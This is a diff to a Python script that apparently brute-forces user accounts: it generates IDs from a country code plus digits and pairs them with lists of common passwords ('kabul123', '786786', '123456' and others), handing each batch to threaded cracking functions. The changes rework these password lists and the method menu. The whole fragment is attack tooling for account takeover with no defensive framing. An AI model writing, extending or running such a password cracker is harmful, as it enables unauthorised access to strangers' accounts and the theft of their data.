@@ -567,7 +567,7 @@ def pak():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [1] Method 1 [2] Method 2 Best ')
+		print(' [1] Method 1    [2] Method 2 Best ')
 		linex()
 		mthd = input(' Choose: ')
 		linex()
@@ -587,12 +587,13 @@ def pak():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['2','02']:
-					passlist = [psx,ids]
-				elif pcs in ['1','01']:
 					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
+				elif pcs in ['1','01']:
+					passlist = [psx,ids,'100200','200300','786786','500600','10002000','۱۲۳۴۵۶','123456','123456789']
 				else:
 					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost12']
 				if mthd in ['2','02']:
+					passlist = [psx,ids,'100200','200300','786786','500600','10002000','۱۲۳۴۵۶','123456','123456789']
 					AXI.submit(rcrack1,ids,passlist)
 				else:
 					AXI.submit(rcrack,ids,passlist)
